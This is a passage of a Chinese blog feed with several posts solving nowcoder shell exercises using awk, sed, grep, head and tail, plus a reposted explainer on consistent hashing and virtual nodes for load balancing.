    <entry>
      <title>shell系列题之统计所有进程占用内存大小的和</title>
      <link href="/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%92%8C/"/>
      <url>/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>假设 nowcoder.txt 内容如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root         2  0.0  0.0      0     0 ?        S    9月25   0:00 [kthreadd]</span><br><span class="line">root         4  0.0  0.0      0     0 ?        I&lt;   9月25   0:00 [kworker/0:0H]</span><br><span class="line">web       1638  1.8  1.8 6311352 612400 ?      Sl   10月16  21:52 test</span><br><span class="line">web       1639  2.0  1.8 6311352 612401 ?      Sl   10月16  21:52 test</span><br><span class="line">tangmiao-pc       5336   0.0  1.4  9100240 238544   ??  S     3:09下午   0:31.70 /Applications</span><br></pre></td></tr></table></figure><p>以上内容是通过ps aux | grep -v ‘RSS TTY’ 命令输出到nowcoder.txt文件下面的<br>请你写一个脚本计算一下所有进程占用内存大小的和:</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>1、</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum=0</span><br><span class="line">    for i in `awk &#x27;&#123;print $6&#125;&#x27; nowcoder.txt`</span><br><span class="line">    do</span><br><span class="line">        ((sum+=$i))</span><br><span class="line">        done</span><br><span class="line">    echo $sum  </span><br></pre></td></tr></table></figure><p>此处利用for循环，用变量i来接收nowcoder.txt文件每一行对应的数据，利用awk对每一行数据进行切割，输出第6快区域的数据信息<br>2、</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum=0</span><br><span class="line">while read p</span><br><span class="line">    do</span><br><span class="line">        ((sum+=<span class="variable">$(echo $p|awk &#x27;&#123;print $6&#125;&#x27;)</span>));        </span><br><span class="line">    done &lt; nowcoder.txt</span><br><span class="line">echo $sum</span><br></pre></td></tr></table></figure><p>通过read命令来读写数据，变量p表示所读取的每一行的数据，同时通过管道命令与awk命令结合查询，得到每行的第6快区域的数据信息。<br>3、</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;sum+=$6&#125;END&#123;print sum&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure><p>3和4解法类似，都是利用awk的强大功能，由第一行开始读写，读到最后一行结束<br>4、</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;sum=0&#125;&#123;sum+=$6&#125;END&#123;print sum&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure><p>5、《性能最佳》</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sum=0;</span><br><span class="line">while read p</span><br><span class="line">do</span><br><span class="line">    arr=($p)</span><br><span class="line">    ((sum+=arr[5]))</span><br><span class="line">done &lt;nowcoder.txt</span><br><span class="line">echo $sum</span><br></pre></td></tr></table></figure><p>此类解法未使用awk命令，为性能最佳，通过定义数组接收每行的数据，arr[5]则表示第5块区域的数据信息。</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之统计每个单词出现的个数</title>
      <link href="/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E5%8D%95%E8%AF%8D%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%AA%E6%95%B0/"/>
      <url>/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E5%8D%95%E8%AF%8D%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>写一个 bash脚本以统计一个文本文件 nowcoder.txt 中每个单词出现的个数。</p><p>为了简单起见，你可以假设：<br>nowcoder.txt只包括小写字母和空格。<br>每个单词只由小写字母组成。<br>单词间由一个或多个空格字符分隔。</p><p>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome nowcoder</span><br><span class="line">welcome to nowcoder</span><br><span class="line">nowcoder</span><br></pre></td></tr></table></figure><p>你的脚本应当输出（以词频升序排列）：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">to 1 </span><br><span class="line">welcome 2 </span><br><span class="line">nowcoder 3 </span><br></pre></td></tr></table></figure><p>说明:<br>不要担心个数相同的单词的排序问题，每个单词出现的个数都是唯一的。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意 awk 是一行一行处理的</span></span><br><span class="line"><span class="comment">#a[] 可以理解成是个map</span></span><br><span class="line"><span class="comment">#NF是每行有几个域</span></span><br><span class="line"><span class="comment">#$i 是取这一行的第i个值</span></span><br><span class="line"><span class="comment"># END是指最后执行的意思</span></span><br><span class="line">awk &#x27;&#123;for(i=1;i&lt;=NF;i++) a[$i]+=1&#125;END&#123;for(x in a) print x,a[x]&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之打印字母数小于8的单词</title>
      <link href="/2022/04/09/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%B0%8F%E4%BA%8E8%E7%9A%84%E5%8D%95%E8%AF%8D/"/>
      <url>/2022/04/09/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%B0%8F%E4%BA%8E8%E7%9A%84%E5%8D%95%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>写一个 bash脚本以统计一个文本文件 nowcoder.txt中字母数小于8的单词。</p><p>示例:<br>假设 nowcoder.txt 内容如下：<br>how they are implemented and applied in computer </p><p>你的脚本应当输出：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">how</span><br><span class="line">they</span><br><span class="line">are</span><br><span class="line">and</span><br><span class="line">applied</span><br><span class="line">in</span><br></pre></td></tr></table></figure><p>说明:<br>不要担心你输出的空格以及换行的问题</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>用空格进行分割，NF是当前记录的字段数，也可以说是单词数;<br>然后for循环嵌套if判断;<br>当当前字段的长度小于8时，将其打印出来;</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F<span class="string">&quot; &quot;</span> &#x27;&#123;for(i=1;i&lt;=NF;i++)&#123;if(length($i) &lt; 8)&#123;print $i&#125;&#125;&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之去掉空行</title>
      <link href="/2022/04/07/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E5%8E%BB%E6%8E%89%E7%A9%BA%E8%A1%8C/"/>
      <url>/2022/04/07/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E5%8E%BB%E6%8E%89%E7%A9%BA%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>写一个 bash脚本以去掉一个文本文件 nowcoder.txt中的空行<br>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">abc</span><br><span class="line"></span><br><span class="line">567</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ccc</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc</span><br><span class="line">567</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br></pre></td></tr></table></figure><h2 id="题解-去掉空行"><a href="#题解-去掉空行" class="headerlink" title="题解 | #去掉空行#"></a>题解 | #去掉空行#</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>awk 命令，判断当前行的内容然后输出<br><code>awk &#39;&#123;if($0 != &quot;&quot;) &#123;print $0&#125;&#125;&#39; ./nowcoder.txt</code><br><code>awk &#39;!/^$/ &#123;print $NF&#125;&#39;</code><br>或者<br><code>awk &#39;!/^$/ &#123;print $0&#125;&#39;</code></p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>cat 输出文本内容，然后通过管道符交由 awk 做非空校验然后输出<br><code>cat ./nowcoder.txt | awk NF</code></p><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><p>grep 命令</p><ol><li>-v 显示不包含匹配文本的所有行</li></ol><p><code>cat ./nowcoder.txt | awk NF</code></p><ol start="2"><li>-e 指定字符串做为查找文件内容的样式</li></ol><p><code>grep -e &#39;\S&#39;</code><br>或者<br><code>grep  &#39;\S&#39;</code></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之打印空行的行号</title>
      <link href="/2022/04/06/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E7%A9%BA%E8%A1%8C%E7%9A%84%E8%A1%8C%E5%8F%B7/"/>
      <url>/2022/04/06/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E7%A9%BA%E8%A1%8C%E7%9A%84%E8%A1%8C%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>写一个 bash脚本以输出一个文本文件 nowcoder.txt中空行的行号,可能连续,从1开始<br>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><ul><li>grep匹配空行，awk去掉冒号</li></ul><p><code>grep -n &#39;^$&#39; nowcoder.txt | awk -F: &#39;&#123;print $1&#125;&#39;</code></p><ul><li><strong>awk正则匹配空行,然后呢输出行数</strong></li></ul><p><code>**awk &#39;/^$/&#123;print NR&#125;&#39; nowcoder.txt**</code><br>/^$/之间写正则表达式</p><ul><li>sed正则匹配空行，=输出行数</li></ul><p><code>sed -n &#39;/^$/=&#39; nowcoder.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之输出第5行的内容</title>
      <link href="/2022/04/05/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA%E7%AC%AC5%E8%A1%8C%E7%9A%84%E5%86%85%E5%AE%B9/"/>
      <url>/2022/04/05/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA%E7%AC%AC5%E8%A1%8C%E7%9A%84%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>写一个 bash脚本以输出一个文本文件 nowcoder.txt 中第5行的内容。<br>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">welcome</span><br><span class="line">to</span><br><span class="line">nowcoder</span><br><span class="line">this</span><br><span class="line">is</span><br><span class="line">shell</span><br><span class="line">code</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：<br>is</p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>head 命令拿到前五行，再通过通道，通过tail取出来最后一行，即第五行</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 5 nowcoder.txt | tail -n 1</span><br></pre></td></tr></table></figure><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>sed 命令中的 p 子命令，打印第五行</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;5p&#x27;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>head 从头开始打印，tail 从未开始打印，sed 从中间开始打印</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是一致性哈希</title>
      <link href="/2022/04/04/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/"/>
      <url>/2022/04/04/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文转自<a href="https://www.cnblogs.com/xiaolincoding/p/15918321.html">https://www.cnblogs.com/xiaolincoding/p/15918321.html</a></p></blockquote><p>大家好，我是小林。<br>在逛牛客网的面经的时候，发现有位同学在面微信的时候，被问到这个问题：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/14.png"><br>第一个问题就是：<strong>一致性哈希是什么，使用场景，解决了什么问题？</strong><br>这个问题还挺有意思的，所以今天就来聊聊这个。<br>发车！<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/15.png"></p><h2 id="如何分配请求？"><a href="#如何分配请求？" class="headerlink" title="如何分配请求？"></a><strong>如何分配请求？</strong></h2><p>大多数网站背后肯定不是只有一台服务器提供服务，因为单机的并发量和数据量都是有限的，所以都会用多台服务器构成集群来对外提供服务。<br>但是问题来了，现在有那么多个节点（后面统称服务器为节点，因为少一个字），要如何分配客户端的请求呢？<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/16.png"><br>其实这个问题就是「负载均衡问题」。解决负载均衡问题的算法很多，不同的负载均衡算法，对应的就是不同的分配策略，适应的业务场景也不同。<br>最简单的方式，引入一个中间的负载均衡层，让它将外界的请求「轮流」的转发给内部的集群。比如集群有 3 个节点，外界请求有 3 个，那么每个节点都会处理 1 个请求，达到了分配请求的目的。<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/17.png"><br>考虑到每个节点的硬件配置有所区别，我们可以引入权重值，将硬件配置更好的节点的权重值设高，然后根据各个节点的权重值，按照一定比重分配在不同的节点上，让硬件配置更好的节点承担更多的请求，这种算法叫做加权轮询。<br>加权轮询算法使用场景是建立在每个节点存储的数据都是相同的前提。所以，每次读数据的请求，访问任意一个节点都能得到结果。<br>但是，加权轮询算法是无法应对「分布式系统」的，因为分布式系统中，每个节点存储的数据是不同的。<br>当我们想提高系统的容量，就会将数据水平切分到不同的节点来存储，也就是将数据分布到了不同的节点。比如<strong>一个分布式 KV（key-valu） 缓存系统，某个 key 应该到哪个或者哪些节点上获得，应该是确定的</strong>，不是说任意访问一个节点都可以得到缓存结果的。<br>因此，我们要想一个能应对分布式系统的负载均衡算法。</p><h2 id="使用哈希算法有什么问题？"><a href="#使用哈希算法有什么问题？" class="headerlink" title="使用哈希算法有什么问题？"></a><strong>使用哈希算法有什么问题？</strong></h2><p>有的同学可能很快就想到了：<strong>哈希算法</strong>。因为对同一个关键字进行哈希计算，每次计算都是相同的值，这样就可以将某个 key 确定到一个节点了，可以满足分布式系统的负载均衡需求。<br>哈希算法最简单的做法就是进行取模运算，比如分布式系统中有 3 个节点，基于 hash(key) % 3 公式对数据进行了映射。<br>如果客户端要获取指定 key 的数据，通过下面的公式可以定位节点：<br>hash(key) % 3<br>如果经过上面这个公式计算后得到的值是 0，就说明该 key 需要去第一个节点获取。<br>但是有一个很致命的问题，<strong>如果节点数量发生了变化，也就是在对系统做扩容或者缩容时，必须迁移改变了映射关系的数据</strong>，否则会出现查询不到数据的问题。<br>举个例子，假设我们有一个由 A、B、C 三个节点组成分布式 KV 缓存系统，基于计算公式 hash(key) % 3 将数据进行了映射，每个节点存储了不同的数据：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/18.png"><br>现在有 3 个查询 key 的请求，分别查询 key-01，key-02，key-03 的数据，这三个 key 分别经过 hash() 函数计算后的值为 hash( key-01) = 6、hash( key-02) = 7、hash(key-03) = 8，然后再对这些值进行取模运算。<br>通过这样的哈希算法，每个 key 都可以定位到对应的节点。<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/19.png"><br>当 3 个节点不能满足业务需求了，这时我们增加了一个节点，节点的数量从 3 变化为 4，意味取模哈希函数中基数的变化，这样会导致<strong>大部分映射关系改变</strong>，如下图：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/20.png"><br>比如，之前的 hash(key-01) % 3 = 0，就变成了 hash(key-01) % 4 = 2，查询 key-01 数据时，寻址到了节点 C，而 key-01 的数据是存储在节点 A 上的，不是在节点 C，所以会查询不到数据。<br>同样的道理，如果我们对分布式系统进行缩容，比如移除一个节点，也会因为取模哈希函数中基数的变化，可能出现查询不到数据的问题。<br>要解决这个问题的办法，就需要我们进行<strong>迁移数据</strong>，比如节点的数量从 3 变化为 4 时，要基于新的计算公式 hash(key) % 4 ，重新对数据和节点做映射。<br>假设总数据条数为 M，哈希算法在面对节点数量变化时，**最坏情况下所有数据都需要迁移，所以它的数据迁移规模是 O(M)**，这样数据的迁移成本太高了。<br>所以，我们应该要重新想一个新的算法，来避免分布式系统在扩容或者缩容时，发生过多的数据迁移。</p><h2 id="使用一致性哈希算法有什么问题？"><a href="#使用一致性哈希算法有什么问题？" class="headerlink" title="使用一致性哈希算法有什么问题？"></a><strong>使用一致性哈希算法有什么问题？</strong></h2><p>一致性哈希算法就很好地解决了分布式系统在扩容或者缩容时，发生过多的数据迁移的问题。<br>一致哈希算法也用了取模运算，但与哈希算法不同的是，哈希算法是对节点的数量进行取模运算，而<strong>一致哈希算法是对 2^32 进行取模运算，是一个固定的值</strong>。<br>我们可以把一致哈希算法是对 2^32 进行取模运算的结果值组织成一个圆环，就像钟表一样，钟表的圆可以理解成由 60 个点组成的圆，而此处我们把这个圆想象成由 2^32 个点组成的圆，这个圆环被称为<strong>哈希环</strong>，如下图：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/21.png"><br>一致性哈希要进行两步哈希：</p><ul><li>第一步：对存储节点进行哈希计算，也就是对存储节点做哈希映射，比如根据节点的 IP 地址进行哈希；</li><li>第二步：当对数据进行存储或访问时，对数据进行哈希映射；</li></ul><p>所以，<strong>一致性哈希是指将「存储节点」和「数据」都映射到一个首尾相连的哈希环上</strong>。<br>问题来了，对「数据」进行哈希映射得到一个结果要怎么找到存储该数据的节点呢？<br>答案是，映射的结果值往<strong>顺时针的方向的找到第一个节点</strong>，就是存储该数据的节点。<br>举个例子，有 3 个节点经过哈希计算，映射到了如下图的位置：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/22.png"><br>接着，对要查询的 key-01 进行哈希计算，确定此 key-01 映射在哈希环的位置，然后从这个位置往顺时针的方向找到第一个节点，就是存储该 key-01 数据的节点。<br>比如，下图中的 key-01 映射的位置，往顺时针的方向找到第一个节点就是节点 A。<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/23.png"><br>所以，当需要对指定 key 的值进行读写的时候，要通过下面 2 步进行寻址：</p><ul><li>首先，对 key 进行哈希计算，确定此 key 在环上的位置；</li><li>然后，从这个位置沿着顺时针方向走，遇到的第一节点就是存储 key 的节点。</li></ul><p>知道了一致哈希寻址的方式，我们来看看，如果增加一个节点或者减少一个节点会发生大量的数据迁移吗？<br>假设节点数量从 3 增加到了 4，新的节点 D 经过哈希计算后映射到了下图中的位置：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/24.png"><br>你可以看到，key-01、key-03 都不受影响，只有 key-02 需要被迁移节点 D。<br>假设节点数量从 3 减少到了 2，比如将节点 A 移除：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/25.png"><br>你可以看到，key-02 和 key-03 不会受到影响，只有 key-01 需要被迁移节点 B。<br>因此，<strong>在一致哈希算法中，如果增加或者移除一个节点，仅影响该节点在哈希环上顺时针相邻的后继节点，其它数据也不会受到影响</strong>。<br>上面这些图中 3 个节点映射在哈希环还是比较分散的，所以看起来请求都会「均衡」到每个节点。<br>但是<strong>一致性哈希算法并不保证节点能够在哈希环上分布均匀</strong>，这样就会带来一个问题，会有大量的请求集中在一个节点上。<br>比如，下图中 3 个节点的映射位置都在哈希环的右半边：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/26.png"><br>这时候有一半以上的数据的寻址都会找节点 A，也就是访问请求主要集中的节点 A 上，这肯定不行的呀，说好的负载均衡呢，这种情况一点都不均衡。<br>另外，在这种节点分布不均匀的情况下，进行容灾与扩容时，哈希环上的相邻节点容易受到过大影响，容易发生雪崩式的连锁反应。<br>比如，上图中如果节点 A 被移除了，当节点 A 宕机后，根据一致性哈希算法的规则，其上数据应该全部迁移到相邻的节点 B 上，这样，节点 B 的数据量、访问量都会迅速增加很多倍，一旦新增的压力超过了节点 B 的处理能力上限，就会导致节点 B 崩溃，进而形成雪崩式的连锁反应。<br>所以，<strong>一致性哈希算法虽然减少了数据迁移量，但是存在节点分布不均匀的问题</strong>。</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="如何通过虚拟节点提高均衡度？"><a href="#如何通过虚拟节点提高均衡度？" class="headerlink" title="如何通过虚拟节点提高均衡度？"></a><strong>如何通过虚拟节点提高均衡度？</strong></h2><p>要想解决节点能在哈希环上分配不均匀的问题，就是要有大量的节点，节点数越多，哈希环上的节点分布的就越均匀。<br>但问题是，实际中我们没有那么多节点。所以这个时候我们就加入<strong>虚拟节点</strong>，也就是对一个真实节点做多个副本。<br>具体做法是，<strong>不再将真实节点映射到哈希环上，而是将虚拟节点映射到哈希环上，并将虚拟节点映射到实际节点，所以这里有「两层」映射关系。</strong><br>比如对每个节点分别设置 3 个虚拟节点：</p><ul><li>对节点 A 加上编号来作为虚拟节点：A-01、A-02、A-03</li><li>对节点 B 加上编号来作为虚拟节点：B-01、B-02、B-03</li><li>对节点 C 加上编号来作为虚拟节点：C-01、C-02、C-03</li></ul><p>引入虚拟节点后，原本哈希环上只有 3 个节点的情况，就会变成有 9 个虚拟节点映射到哈希环上，哈希环上的节点数量多了 3 倍。<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/27.png"><br>你可以看到，<strong>节点数量多了后，节点在哈希环上的分布就相对均匀了</strong>。这时候，如果有访问请求寻址到「A-01」这个虚拟节点，接着再通过「A-01」虚拟节点找到真实节点 A，这样请求就能访问到真实节点 A 了。<br>上面为了方便你理解，每个真实节点仅包含 3 个虚拟节点，这样能起到的均衡效果其实很有限。而在实际的工程中，虚拟节点的数量会大很多，比如 Nginx 的一致性哈希算法，每个权重为 1 的真实节点就含有160 个虚拟节点。<br>另外，虚拟节点除了会提高节点的均衡度，还会提高系统的稳定性。<strong>当节点变化时，会有不同的节点共同分担系统的变化，因此稳定性更高</strong>。<br>比如，当某个节点被移除时，对应该节点的多个虚拟节点均会移除，而这些虚拟节点按顺时针方向的下一个虚拟节点，可能会对应不同的真实节点，即这些不同的真实节点共同分担了节点变化导致的压力。<br>而且，有了虚拟节点后，还可以为硬件配置更好的节点增加权重，比如对权重更高的节点增加更多的虚拟机节点即可。<br>因此，<strong>带虚拟节点的一致性哈希方法不仅适合硬件配置不同的节点的场景，而且适合节点规模会发生变化的场景</strong>。</p><h2 id="总结"><a href="#总结" class="headerlink" 